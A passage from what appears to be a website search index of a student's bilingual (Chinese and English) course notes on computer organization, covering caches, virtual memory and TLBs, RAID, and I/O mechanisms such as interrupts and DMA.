1200(bytes) 1200/16=75 75modulo64=11</p> <p>tag is 22bits 32 - 6 -2 -2</p> <p>larger block can reduce the misssing rate, but will cause more competition(\u5728\u7f13\u5b58\u5927\u5c0f\u4e00\u5b9a\u7684\u60c5\u51b5\u4e0b\uff0cblock\u5927\u8bf4\u660eblock\u6570\u91cf\u5c11\uff0c\u5bb9\u6613\u88ab\u540e\u6765\u8005\u5220\u6389\uff0c\u53cd\u800c\u5bfc\u81f4\u63d0\u9ad8\u4e86missing rate\uff0c\u5e76\u4e14\u6bcf\u6b21\u66f4\u65b0\u7f13\u5b58\u7684\u635f\u8017\u4f1a\u63d0\u9ad8</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#cache-miss","title":"cache miss","text":"<ul> <li>install the pipeline</li> <li>fetch the block from the next level of hierarchy</li> <li>instruction cache missing, restart the instruction fetch</li> <li>data cache missing, complete the data access</li> </ul> <p>cache miss \u7684penalty  P59</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#cache-write","title":"cache write","text":"<p>wirte through</p> <p>\u4e3a\u4e86\u4fdd\u5b58cache\u548c\u5185\u5b58\u7684\u4e00\u81f4\u6027\uff0c\u5199\u56de\u7684\u65f6\u5019\u4e00\u79cd\u65b9\u6cd5\u5c31\u662f\u540c\u65f6\u5199\u7f13\u5b58\u548c\u5185\u5b58\uff0c\u4f46\u662f\u6548\u7387\u4f4e\uff0c\u56e0\u4e3a\u5185\u5b58\u7684\u5199\u5165\u6bd4\u8f83\u6162</p> <p>\u89e3\u51b3\u65b9\u6cd5\u662f\u6709\u4e00\u4e2awrite buffer\uff0c\u5148\u628a\u8981\u5199\u7684\u6570\u636e\u5b58\u5728\u90a3\u91cc\uff0cCPU\u7ee7\u7eed\u6267\u884c\uff0cbuffer\u81ea\u5df1\u53bb\u5199\u5165\u5185\u5b58\u3002\u53ea\u6709\u5f53buffer\u6ee1\u4e86\u4e4b\u540e\u5c31\u505c\u987f\u6d41\u6c34\u7ebf\u6765\u5b8c\u6210\u5199\u5165\u3002</p> <p>write back</p> <p>\u6682\u65f6\u53ea\u5199\u7f13\u5b58\uff0c\u5f53\u8fd9\u5757\u88ab\u5199\u8fc7\u7684\u6570\u636e\u88ab\u66ff\u6362\u7684\u65f6\u5019\uff0c\u66f4\u65b0\u4e3b\u5b58\u3002\u56e0\u6b64\u7f13\u5b58\u8fd8\u9700\u8981\u4e00\u4e2adirty bit\u4f4d\uff0c\u6765\u5224\u65ad\u8fd9\u4e2a\u6570\u636e\u662f\u5426\u88ab\u5199\u8fc7</p> <p>\u540c\u6837\u7684\u5728\u66f4\u65b0\u5185\u5b58\u7684\u65f6\u5019\u4e5f\u9700\u8981\u7b49\u5f85\uff0c\u56e0\u4e3a\u8981\u4e0e\u4e3b\u5b58\u4ea4\u6d41\uff0c\u8fd9\u65f6\u6211\u4eec\u4e5f\u53ef\u4ee5\u91c7\u7528\u4e0a\u8ff0\u7684write buffer\u7684\u505a\u6cd5</p> <p>write allocation</p> <p>\u4e0a\u8ff0\u4e24\u79cd\u60c5\u51b5\u662f\u6307\u5199\u7684\u4e1c\u897f\u5728\u7f13\u5b58\u4e2d\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u5199\u7684\u4e1c\u897f\u4e0d\u4e00\u5b9a\u5b58\u5728\u4e8e\u7f13\u5b58\u4e2d\uff0c\u8fd9\u5c31\u884d\u751f\u4e86\u4e24\u79cd\u505a\u6cd5\uff0c\u662f\u5426\u8981\u628a\u8981\u5199\u7684\u4e1c\u897f\u653e\u5230\u7f13\u5b58\u4e2d\u3002</p> <p>write allocation \u5c31\u662f\u6682\u65f6\u4e0d\u628a\u5185\u5bb9\u5199\u5165\u5185\u5b58\uff0c\u5148\u5199\u5165\u7f13\u5b58\uff0c\u5728flush\u7684\u65b9\u5f0f\u5199\u5165\u5185\u5b58</p> <p>\u5bf9\u4e8ewrite through\u7684\u8bdd\u4e24\u79cd\u505a\u6cd5\u90fd\u6709\uff0cwrite back\u7684\u8bdd\u4e00\u822c\u90fd\u4f1a\u8fdb\u884cwrite allocate</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#cache-performance","title":"cache performance","text":"<p>measuring cache perfromance</p> <p>P40</p> <p>memory stall cycles = memory accesses / programs x miss rate x miss penalty(\u7f3a\u5931\u4ee3\u4ef7)</p> <p>\u5e73\u5747\u5185\u5b58\u8bbf\u95ee\u6b21\u6570 x \u7f3a\u5931\u7387 x \u7f3a\u5931\u4ee3\u4ef7</p> <p>average memroy access time = hit time + missing rate * miss penalty</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#associative-cache","title":"associative cache","text":"<p>block\u7684\u5927\u5c0f\u7684\u8003\u91cf\uff0c\u5982\u679c\u4e00\u4e2ablock\u5bf9\u5e94\u4e00\u4e2adata\uff0c\u5c31\u5f88\u5bb9\u6613\u88ab\u76f8\u540chash\u7684\u9876\u66ff\u6389\uff0c\u5982\u679c\u5bf9\u5e94\u592a\u591a\uff0c\u5219\u7535\u8def\u592a\u590d\u6742\uff0c\u6807\u8bb0\u4f4d\u6570\u548c\u989d\u5916\u7684\u5f00\u9500\u4e5f\u4f1a\u66f4\u5927</p> <p>\u6709\u4e24\u79cd\u6a21\u5f0f fully associative \u548c n-way set associative</p> <p>fully associative</p> <ul> <li>\u91c7\u7528\u7684\u662f\u4e0d\u56fa\u5b9a\u7684\u6620\u5c04\u65b9\u5f0f\uff0c\u5bf9\u4e8e\u76f4\u63a5\u6620\u5c04\u6765\u8bf4\uff0c\u67d0\u4e2a\u5730\u5740\u7684\u5185\u5b58\u53ea\u80fd\u56fa\u5b9a\u6620\u5c04\u5230\u67d0\u5757cache\u4e2d\uff0c\u4f46\u662f\u5168\u76f8\u8fde\u53ef\u4ee5\u8ba9\u4e00\u5757\u5185\u5b58\u6620\u5c04\u5230\u4efb\u610f\u4e00\u5757cache\u4e2d\uff0c\u9700\u8981\u66ff\u6362\u7684\u65f6\u5019\u904d\u5386cache\u4e2d\u6240\u6709\u5757</li> <li>\u5176\u6838\u5fc3\u662f\u8fd9\u4e2a\u66ff\u6362\u7b97\u6cd5</li> <li>\u63d0\u9ad8\u4e86\u547d\u4e2d\u7387\uff0c\u4f46\u662f\u964d\u4f4e\u4e86\u65f6\u95f4\u6548\u7387</li> </ul> <p>n-way set associative</p> <ul> <li>\u662f\u5168\u76f8\u8fde\u548c\u76f4\u63a5\u6620\u5c04\u7684\u6298\u4e2d\u3002\u5c06\u5185\u5b58\u548ccache\u90fd\u5206\u7ec4\uff0c\u7ec4\u4e4b\u95f4\u91c7\u7528\u76f4\u63a5\u6620\u5c04\uff0c\u7ec4\u5185\u91c7\u7528\u5168\u76f8\u8fde</li> <li>\u6bcf\u7ec4\u4e2d\u67092,4,8,16 \u8bb0\u4f5c 2-way set associative ...</li> </ul> <p>replace policy</p> <p>\u76f4\u63a5\u6620\u5c04\uff0c\u6ca1\u6709\u9009\u62e9\u7684\u4f59\u5730</p> <p>\u4e00\u4e2ablock\u5bf9\u5e94\u591a\u4e2adata\u7684\u65f6\u5019\uff0c\u9700\u8981\u786e\u5b9a\u66ff\u6362\u65f6\u54ea\u4e2a\u4f1a\u88ab\u66ff\u6362\u6389</p> <p>\u4e00\u822c\u4f1a\u7528LRU least-recently used</p> <p>\u6bd4\u5982\u5bf9\u4e8e\u4e24\u8def\u7684\uff0c\u6bcf\u6b21\u8bbf\u95ee\u7f13\u5b58\u7684\u65f6\u5019\u8bbe\u7f6e\u4e00\u4e2abit\uff0c0\u8868\u793a\u7b2c0\u4e2a\u88ab\u8bbf\u95ee\uff0c1\u8868\u793a\u7b2c1\u4e2a\u88ab\u8bbf\u95ee\uff0c\u6bcf\u6b21\u6765\u66ff\u6362\u7684\u65f6\u5019\uff0c\u66ff\u6362\u53e6\u4e00\u4e2a\uff0c\u6bd4\u5982\u4e3a0\u5c31\u66ff\u6362</p> <p>example: size of tag of set associativity</p> <p>4096 blocks, 4-word block size, 32-bit address</p> <ul> <li>\u76f4\u63a5\u6620\u5c04  \uff0832-2-2-12\uff09* 4096</li> <li>2-way set associativity \uff0832-2-2-11) x 2 x 2048</li> <li>4-way set associativity   (32-2-2-10) x 4 x 1024</li> <li>\u5168\u76f8\u8fde     (32-2-2)*4096</li> </ul> <p>multilevel caches</p> <p>\u591a\u7ea7\u7684cache\u4e00\u822c\u4f1a\u8d8a\u6765\u8d8a\u5927</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#dependability","title":"dependability","text":"<p>P67</p> <p>ECC hamming code \u539f\u7406\u5206\u6790\uff0chamming code\u9700\u8981\u989d\u5916\u7684bit\uff0c\u8fd9\u4e9bbit\u8981\u53ef\u4ee5\u8868\u793a\u6ca1\u95ee\u9898\u548c\u5728x\u4f4d\u4e0a\u6709\u95ee\u9898</p> <p>\u4e00\u5171\u6709d\u4f4d\u4fe1\u606f\uff0cp\u4f4d\u989d\u5916bit</p> <p>2^p &gt; p + d +1</p> <p>\u8fd9\u6837\u7b97\u51fa\u6765\u7684p\uff0c\u5982\u679c\u9700\u8981DED\uff0c\u8fd8\u9700\u8981\u52a0\u4e00</p> <p>\u6211\u4eec\u9700\u8981\u628ap\u4f4dbit\u548cd\u4f4d\u4fe1\u606f\u91cd\u65b0\u6392\u5217\u3002</p> <p>\u200b\u200b</p> <p>\u591a\u52a0\u7684\u4e00\u4f4d\u6709D1-D15\u7684\u5947\u5076\u6821\u9a8c\u6784\u6210</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#virtual-machine","title":"virtual machine","text":"<p>VMM virtual machine monitor</p> <ul> <li>map the virtual resources to physical resource</li> <li>guest code runs on native machine in usr mode</li> <li>gutst OS may be different from host OS</li> <li>VMM handles real IO devices</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#virtual-memory","title":"virtual memory","text":"<p>the main idea of the VM is use the main memory as a cache for disk.</p> <ul> <li>programs share main memory</li> <li>CPU and OS translate virtual addresses to physical addresses</li> </ul> <p>page fault</p> <p>\u610f\u5473\u7740\u9700\u8981\u8bbf\u95eedisk \u4f1a\u82b1\u8d39\u6570\u767e\u4e07clock cycles \u7531OS code\u5904\u7406</p> <ul> <li>\u4f1a\u4f7f\u7528LRU(least recently used) \u51cf\u5c11page fault rate</li> </ul> <p>page table</p> <ul> <li>store placement information, including array of page table entries   page table register in CPU points to page table</li> <li>if page is present in memory, page translation entry(PTE) stores the physical page number</li> <li>if page is not present, PTE can refer to location in swap space on disk</li> </ul> <p>page table\u653e\u5728\u5185\u5b58\u91cc</p> <p>size of page table</p> <ul> <li>32-bit virtual address, 4kb pages, 4 bytes per page table entry   4kb = 2 ^ 12 b   2 ^ (32 - 12) entries * 4 bytes</li> </ul> <p>we need to reduce the memory for page table</p> <ul> <li>use the multiple levels of page table</li> <li>use the inverted page table, apply a hashing function to the virtual address</li> </ul> <p>PTE: page translation entry</p> <p>fast translation using a TLB:</p> <ul> <li>\u4e3a\u9875\u8868\u5f00\u4e00\u4e2acache\uff0cwe called translation look-aside buffer(TLB</li> <li>\u5e38\u89c1\u72b6\u6001 16-512 PTEs\uff0c0.5-1 cycle for hit, 10-100 cycles for miss, 0.01% - 1% miss rate</li> <li>if page is in memory, load the PTE from memory and retry, could be handled in hardware / software</li> <li>if page is not in memory, (page fault), OS handles fetch the page and updating the page table, and then restart</li> <li>TLB miss \u4f1a\u9020\u6210\u4e00\u4e2aexception\uff0c\u505c\u987f\u8be5\u6307\u4ee4\uff0chandler copies PTE from memory to TLB\uff0crestart the instruction</li> </ul> <p>handler \u7684\u505a\u6cd5</p> <ul> <li>using faulting virtual address to find PTE</li> <li>locate page on disk</li> <li>choose page to replace(if dirty, write to disk first)</li> <li>read page into memory and update the page table</li> <li>make process runnable</li> </ul> <p>\u5e38\u89c4\u8bbf\u95ee\u5185\u5b58  virtual address - &gt; TLB - &gt; physical address - &gt; cache</p> <p>TLB \u548c cache\u7528\u786c\u4ef6\u5904\u7406 \u7f3a\u9875\u7528OS\u5904\u7406</p> <p>\u200b\u200b</p> <p>\u5bf9\u4e8eTLB\uff0cpage table\uff0ccache</p> <ul> <li>hit hit hit</li> <li>hit hit miss, miss hit hit \u8bbf\u5b58\u4e00\u6b21</li> <li>miss hit miss \u8bbf\u5b58\u81f3\u5c11\u4e24\u6b21</li> <li>miss miss miss \u8bbf\u95ee\u78c1\u76d8\u4e00\u6b21\uff0c\u8bbf\u5b58\u81f3\u5c11\u4e24\u6b21</li> </ul> <p>\u4e0d\u53ef\u80fdTLBhit\u7684\u60c5\u51b5\u4e0bmiss page table. \u4e5f\u4e0d\u53ef\u80fd\u5728page table miss\u7684\u60c5\u51b5\u4e0bhit cache</p> <p>virtual memory \u90fd\u662f\u91c7\u7528write back\u7684\u65b9\u5f0f\uff0c\u6240\u4ee5\u6709dirty bit\uff0c\u8fd8\u6709valid\uff0cRef(\u6700\u8fd1\u662f\u5426\u8bbf\u95ee\u8fc7)</p> <p>memory protection:</p> <ul> <li>different tasks can share parts of their virtual address spaces   \u6211\u53ef\u80fd\u53ef\u4ee5\u5141\u8bb8\u5176\u4ed6\u8fdb\u7a0b\uff0c\u8bfb\u5199\u6211\u7684page</li> </ul> <p>hardware support:</p> <ul> <li>privileged supervisor mode (kernel mode</li> <li>privileged instruction</li> <li>page table and other state information only accessible in kernel mode</li> <li>syscall</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#program-performance","title":"program performance","text":"<p>thrashing:</p> <p>a program continuously swaps page between memory and disk, called thrashing (\u9020\u6210\u7a0b\u5e8f\u5f88\u6162\uff0c\u4e00\u822c\u901a\u8fc7\u589e\u52a0\u5185\u5b58\u53ef\u4ee5\u7f13\u89e3)</p> <p>working set:</p> <p>this set of popular pages is called working set \u90a3\u4e9b\u7a0b\u5e8f\u4e2d\u5e38\u7528\u7684page</p> <p>TLB missing\uff1a</p> <ul> <li>TLB \u4e00\u822c\u638c\u63e132-64\u4e2apage entries</li> <li>\u4e00\u4e2apage entry\u4e00\u822c\u662f4kb</li> <li>MIPS \u4e5f\u652f\u630116kb 64kb ... 256mb  \u628apage\u6269\u5927\uff0c\u53ef\u4ee5\u51cf\u5c11TLB missing\u9632\u6b62thrashing</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#memory-hierarchy","title":"memory hierarchy","text":"<p>based on the notion of caching</p> <ul> <li>block placement</li> <li>find the block</li> <li>replacement on a miss</li> <li>write policy</li> </ul> <p>block placement</p> <ul> <li>direct mapped \u76f4\u63a5\u6620\u5c04</li> <li>n-way set associative</li> <li>fully associative \u5168\u76f8\u8fde\uff08\u5185\u5b58\u9875\u7528\u7684\u662f\u5168\u76f8\u8fde\uff0c\u7f3a\u5931\u7387\u6700\u4f4e</li> </ul> <p>find the block</p> <p>**replacement **</p> <ul> <li>LRU least recently used (\u6700\u8fd1\u6ca1\u7528\u8fc7\u7684\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u4e25\u683c\u6309\u7167</li> <li>random</li> </ul> <p>\u5bf9\u4e8evirtual memory \u7528Refer\u4f4d\u6765\u5b9e\u73b0LRU</p> <p>write policy</p> <ul> <li>write through  \u540c\u65f6\u5199cache\u548c\u5185\u5b58\uff08upper and lower level)\uff0c\u4f1a\u6709\u4e00\u4e2abuffer</li> <li>write back        \u53ea\u5199upper level\uff0cupdate when block is replaced</li> </ul> <p>virtual memory \u53ea\u7528write back</p> <p>source of misses</p> <ul> <li>compulsory misses( cold start miss)  \u7b2c\u4e00\u6b21\u8bbf\u95ee\u8fd9\u4e2a\u6570\u636e\u7684\u65f6\u5019\uff0c\u5f88\u6709\u53ef\u80fd\u4f1amiss      (\u589e\u52a0block\u7684\u5927\u5c0f\uff0c\u53ef\u4ee5\u8ba9\u4e34\u8fd1\u7684\u6570\u636e\u8fdb\u5165</li> <li>capacity misses \u56e0\u4e3acache\u7a7a\u95f4\u6709\u9650\u5bfc\u81f4\u7684\uff0ca replaced block is later accessed again  \uff08\u589e\u52a0cache\u5927\u5c0f</li> <li>conflict misses   \u56e0\u4e3a\u4e0d\u662f\u5168\u76f8\u8fde\u5bfc\u81f4\u7684\uff0c\u4e24\u4e2a\u5185\u5b58\u90fd\u6620\u5c04\u5230\u540c\u4e00\u4e2acache\uff0c\u5bfc\u81f4\u867d\u7136cache\u6709\u7a7a\u4f4d\uff0c\u4f46\u8fd8\u662f\u4f1amiss  \uff08\u589e\u52a0associativity</li> </ul> <p>cache\u5927\u5c0f\u548cassociativity\u589e\u52a0\u4f1a\u964d\u4f4e\u901f\u5ea6\uff0cblock\u7684\u589e\u5927\uff0c\u4f1a\u63d0\u9ad8miss penalty\uff0cblock\u662fcache\u8bfb\u5199\u7684\u57fa\u672c\u5355\u5143</p> <p>\u4e00\u7ea7cache\u4e3b\u8981\u63d0\u9ad8\u8bbf\u95ee\u901f\u5ea6\uff0c\u4e8c\u7ea7cache\u4e3b\u8981\u63d0\u9ad8\u547d\u4e2d\u7387</p> <p>cache control</p> <p>P114</p> <p>write allocate  \u8981\u5199\u7684\u4e1c\u897fcache\u4e2d\u6ca1\u6709\uff0c\u662f\u5426\u8981\u5728cache\u4e2d\u5206\u914d</p> <p>16kb = 16*1024bytes</p> <p>valid bit and dirty bit(write back \u7684\u65f6\u5019\u4f1a\u7528)</p> <p>blocking cache  \u7f3a\u5931\u7684\u65f6\u5019\u662f\u5426\u7b49\u5f85\u6d41\u6c34\u7ebf</p> <p>\u6709\u9650\u72b6\u6001\u673a</p> <p>\u7ec4\u5408\u903b\u8f91\u6ca1\u6709\u5185\u90e8\u72b6\u6001</p> <p>\u200b\u200b</p> <p>Idle\u662f\u6307\u7a7a\u95f2</p> <p>cache coherence problem</p> <p>\u5f53\u6709\u591aCPU\u7684\u65f6\u5019\uff0c\u4f1a\u53d8\u5f97\u590d\u6742\uff0c\u4e00\u4e2amemory\u591a\u4e2acache\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u5404\u4e2acache\u4e2d\u4fdd\u5b58\u4e0d\u540c\u6570\u636e\u7248\u672c\uff0c\u4e00\u81f4\u6027\u7684\u7f3a\u5931 P119</p> <p>coherence : we should read return most recently written value.</p> <p>cache coherence protocols:</p> <ul> <li>snooping protocols  \u5bf9each cache monitors bus read / write</li> <li>directory-based protocols</li> </ul> <p>\u4f8b\u5982 invalidating snooping protocols, \u5f53\u4e00\u4e2aCPU\u5199\u7684\u65f6\u5019\uff0c\u628a\u5176\u4ed6CPUcache\u4e2d\u7684\u5185\u5bb9\u4f5c\u5e9f</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#raid","title":"RAID \u5197\u4f59\u78c1\u76d8\u9635\u5217","text":"<p>\u7528\u5197\u4f59\u7684\u6765\u8fdb\u884c\u9519\u8bef\u68c0\u6d4b</p> <p>RAID 0</p> <p>\u65e0\u5197\u4f59\uff0c\u5bb9\u91cf\u548c\u901f\u5ea6\u8981\u6c42\u9ad8\u7684\u975e\u5173\u952e\u6570\u636e\u5b58\u50a8\uff0c\u6709\u8f83\u5feb\u7684IO\u76f8\u5e94\u80fd\u529b</p> <p>RAID 1</p> <p>\u955c\u50cf \u4e00\u5bf9\u4e00\u5197\u4f59\uff0c\u6570\u636e\u53ef\u9760\u6027\u9ad8\uff0c\u8bfb\u53ea\u8981\u8bfb\u5176\u4e2d\u4e00\u4e2a\uff0c\u5199\u540c\u65f6\u5199\u4e24\u4e2a\uff0c\u6570\u636e\u6062\u590d\u5bb9\u6613</p> <p>RAID 5</p> <p>\u5947\u5076\u6821\u9a8c\u5757\u5206\u5e03\u5728\u5404\u4e2a\u78c1\u76d8\u4e2d\uff0c\u6240\u6709\u78c1\u76d8\u5730\u4f4d\u7b49\u4ef7\uff0c\u63d0\u9ad8\u5bb9\u9519\u6027</p>"},{"location":"ZJU-course/%E8%AE%A1%E5%8E%9F/%E8%AE%A1%E5%8E%9F/#io","title":"IO","text":"<p>\u5916\u8bbe\u7684\u53d1\u5c55\u4e0e\u5206\u7c7b</p> <ul> <li>\u4ece\u4ea4\u4e92\u65b9\u5f0f\u6765\u770b\uff0c\u5206\u4e3a\u4eba\u673a\u4ea4\u4e92\u548c\u673a\u5668\u4ea4\u4e92</li> <li>\u4ece</li> </ul> <p>keyboard, mouse, line printer, laser printer, graphics display</p> <p>network-LAN, floppy disk, optical disk, magnetic disk</p> <p>\u5916\u90e8\u8bbe\u5907\u901a\u8fc7\u7535\u7f06\u7ebf\uff0c\u4f20\u8f93\u63a7\u5236\u4fe1\u53f7\uff0c\u72b6\u6001\u4fe1\u53f7\uff0c\u6570\u636e\u4fe1\u53f7</p> <p>\u63a7\u5236\u903b\u8f91\u63a7\u5236\u4fe1\u606f\u63a7\u5236\u8bbe\u5907\u515a\u7684\u64cd\u4f5c\uff0c\u5e76\u68c0\u6d4b\u8bbe\u5907\u72b6\u6001\uff1b\u7f13\u51b2\u5668\u7528\u4e8e\u4fdd\u5b58\u4ea4\u6362\u7684\u4fe1\u606f\uff1b\u53d8\u6362\u5668\u8f6c\u6362\u4e0d\u540c\u7684\u4fe1\u53f7</p> <p>\u952e\u76d8</p> <p>\u952e\u76d8\u548c\u4e3b\u673a\u7684\u94fe\u63a5\uff0c5\u82af\u63a5\u53e3\u7535\u7f06 \u952e\u76d8\u8f93\u5165\u5b57\u7b26\uff0c\u4f7f\u7528ASCII\uff0c128\u4e2a\u5143\u7d20\uff0c\u5176\u4e2d\u5e76\u4e0d\u90fd\u662f\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u4e00\u822c\u662f7\u4f4d\u540e\u8ddf\u4e00\u4e2a\u5947\u5076\u6821\u9a8c ASCII \u8981\u80cc\u5417</p> <ul> <li>\u952e\u76d8\u8f93\u5165\u4fe1\u606f: \u884c\u626b\u63cf\u6cd5\uff0c\u7ebf\u53cd\u8f6c\u6cd5</li> <li>\u4e00\u822c\u5206\u4e3a\u7f16\u7801\u952e\u76d8\uff08\u4f20\u8f93ASCII\uff09\u548c\u975e\u7f16\u7801\u952e\u76d8\uff08\u4f20\u8f93\u4f4d\u7f6e\uff09</li> </ul> <p>IO\u603b\u7ebf\uff0cIO\u63a7\u5236\u5668\u548cIO\u8bbe\u5907</p> <p>\u6709CPU\u603b\u7ebf\uff0c\u5b58\u50a8\u603b\u7ebf\uff0cIO\u603b\u7ebf\uff08disk\u5728IO\u603b\u7ebf\u4e0a\uff09</p> <p>\u7cfb\u7edf\u603b\u7ebf\u4e00\u822c\u7531\uff0c\u6570\u636e\u7ebf\uff08data bus\uff09\uff0c\u63a7\u5236\u7ebf\uff0c\u5730\u5740\u7ebf(address bus)\u7ec4\u6210</p> <p>\u6709\u4e9b\u603b\u7ebf\u4e2d\u5730\u5740\u7ebf\u548c\u6570\u636e\u7ebf\u662f\u5408\u7528\u7684\uff0c\u6570\u636e/\u5730\u5740\u590d\u7528</p> <p>\u603b\u7ebf\u7684\u6027\u80fd\u6307\u6807</p> <ul> <li>\u603b\u7ebf\u5bbd\u5ea6\uff0c\u6570\u636e\u7ebf\u6761\u6570</li> <li>\u603b\u7ebf\u5de5\u4f5c\u9891\u7387\uff0c\u65f6\u949f\u9891\u7387\uff0c\u4e00\u822c\u6162\u4e8e\u7cfb\u7edf\uff0c\u6709\u7684\u65f6\u5019\u4e00\u4e2a\u5468\u671f\u53ef\u4ee5\u4f20\u90012\u6b21\u6216\u56db\u6b21\u6570\u636e\uff0c\u56e0\u6b64\u53ef\u4ee5\u662f\u65f6\u949f\u5468\u671f\u76842\u500d\u6216\u56db\u500d</li> <li>\u603b\u7ebf\u4f20\u9001\u65b9\u5f0f\uff0c\u975e\u7a81\u53d1\u4f20\u9001\uff08\u6bcf\u4e00\u6b21\u4f20\u9001\uff09\u548c\u7a81\u53d1\u4f20\u9001\uff08\u6210\u5757\u4f20\u9001\uff09</li> </ul> <p>IO\u8bbe\u5907\u7684\u5bfb\u5740</p> <p>IO\u7aef\u53e3\u5fc5\u987b\u88ab\u7f16\u53f7</p> <ul> <li>\u7edf\u4e00\u7f16\u5740\u65b9\u5f0f\uff0c\u5c06\u4e3b\u5b58\u7a7a\u95f4\u5206\u51fa\u4e00\u90e8\u5206\u5730\u5740\u7ed9IO\u7aef\u53e3\u8fdb\u884c\u7f16\u53f7\uff0c\u6620\u5c04\u5230\u4e3b\u5b58\u533a\u57df\uff0c\u4e5f\u53eb\u5b58\u50a8\u5668\u6620\u5c04\u65b9\u5f0f\uff0c\u53ef\u4ee5\u7528\u539f\u6709\u7684memory\u8bbf\u95ee\u6307\u4ee4\u64cd\u4f5c</li> <li>\u72ec\u7acb\u7f16\u5740\u65b9\u5f0f\uff0c\u4e0d\u548c\u4e3b\u5b58\u5355\u5143\u4e00\u8d77\u7f16\u53f7\uff0c\u5355\u72ec\u7f16\u53f7\uff0c\u5f62\u6210\u4e00\u4e2a\u5355\u72ec\u7684IO\u5730\u5740\u7a7a\u95f4\uff0c\u9700\u8981\u4e13\u95e8\u7684IO\u6307\u4ee4</li> </ul> <p>IO\u8bbe\u5907\u548c\u4e3b\u673a\u8fdb\u884c\u6570\u636e\u4ea4\u6362</p> <ul> <li>\u7a0b\u5e8f\u76f4\u63a5\u63a7\u5236\uff0c\u4e00\u822c\u662f\u6307\u8f6e\u8be2\uff08polling\uff09,IO\u8bbe\u5907\u4f1a\u6709\u4e00\u4e2a\u72b6\u6001\u5bc4\u5b58\u5668\uff0cOS\u5b9a\u671f\u53bb\u67e5\u8be2\u4e00\u4e0b\uff08\u7b80\u5355\u4f46\u8017\u65f6\uff09</li> <li>IO interrupt \u65b9\u5f0f IO\u8bbe\u5907\u53d1\u51fa\u4e2d\u65ad\u8bf7\u6c42\u7ed9CPU\uff0cCPU\u4e2d\u65ad\u5f53\u524d\u7a0b\u5e8f\u6267\u884c\uff0c\u8c03\u51faOS\u7684\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff0c\u5904\u7406\u5b8c\u4e4b\u540e\u8fd4\u56de\u5f53\u524d\u7a0b\u5e8f\uff08\u53ef\u4ee5\u5e76\u884c\uff09</li> <li>DMA\uff08direct memory access\uff09\u78c1\u76d8\u7b49\u9ad8\u901f\u5916\u5b58\u6210\u6279\u76f4\u63a5\u4e0e\u4e3b\u5b58\u8fdb\u884c\u6570\u636e\u4ea4\u6362\uff0c\u9700\u8981\u6709\u4e13\u95e8\u7684DMA\u63a7\u5236\u5668\uff0c\u5916\u8bbe\u51c6\u5907\u597d\u6570\u636e\uff0cDMA\u53d1\u51fa\u63a7\u5236\u4fe1\u53f7\uff0cCPU\u8ba9\u51fa\u603b\u7ebf\uff0c\u76f4\u63a5\u8bbf\u95eememory(\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u9700\u8981CPU\u4ecb\u5165</li> </ul> <p>\u5904\u7406\u5668\u4e2d\u7684\u5f02\u5e38/\u4e2d\u65ad\u5904\u7406\u673a\u5236</p> <p>\u4e00\u822c\u6765\u8bf4\u5f02\u5e38\u662f\u5185\u90e8\uff0c\u4e2d\u65ad\u662f\u5916\u90e8</p> <ul> <li>\u7981\u6b62\u4e2d\u65ad\uff0c\u8ba9\u4e2d\u65ad\u5141\u8bb8\uff08\u89e6\u53d1\u5668\uff09\u6807\u5fd7\u4e3a0\uff08\u7981\u6b62\u5728\u4e2d\u65ad\u4e2d\u518d\u53d1\u751f\u4e2d\u65ad</li> <li>\u4fdd\u62a4\u65ad\u70b9\u548c\u7a0b\u5e8f\u72b6\u6001\uff0cPC-&gt;EPC</li> <li>\u8bc6\u522b\u5f02\u5e38\u4e8b\u4ef6\u5e76\u8f6c\u5230\u5177\u4f53\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f   \u8f6f\u4ef6\u8bc6\u522b\uff0c\u8bbe\u7f6e\u5f02\u5e38\u72b6\u6001\u5bc4\u5b58\u5668(cause)\uff0c\u8bb0\u5f55\u5f02\u5e38\u539f\u56e0\uff0c\u64cd\u4f5c\u7cfb\u7edf\u8c03\u7528\u7edf\u4e00\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f   \u786c\u4ef6\u8bc6\u522b\uff08\u5411\u91cf\u4e2d\u65ad\uff09</li> </ul> <p>\u591a\u91cd\u4e2d\u65ad\uff0c\u4e2d\u65ad\u5904\u7406\u8fc7\u7a0b\u4e2d\uff0c\u53c8\u6709\u65b0\u7684\u4e2d\u65ad\u53d1\u751f\uff0c\u4e14\u4f18\u5148\u7ea7\u66f4\u9ad8\uff0c\u5e94\u8be5\u518d\u7ec8\u6b62\u73b0\u5728\u7684\u4e2d\u65ad\u5904\u7406\u670d\u52a1\uff0c\u53bb\u5904\u7406\u65b0\u7684\u4e2d\u65ad</p> <p>\u4f1a\u6709\u5806\u6808\u6765\u5b58\u50a8\u4fe1\u606f</p> <ul> <li>\u4e2d\u65ad\u54cd\u5e94\u4f18\u5148\u7ea7</li> <li>\u4e2d\u65ad\u5904\u7406\u4f18\u5148\u7ea7</li> </ul> <p>DMA</p> <p>\u4e2d\u65ad\u4e0d\u9002\u5408\u9ad8\u901f\u8bbe\u5907\u548c\u4e3b\u673a\u7684\u6570\u636e\u4f20\u8f93</p> <ul> <li>\u9ad8\u901f\u8bbe\u5907\u548c\u5916\u5b58</li> 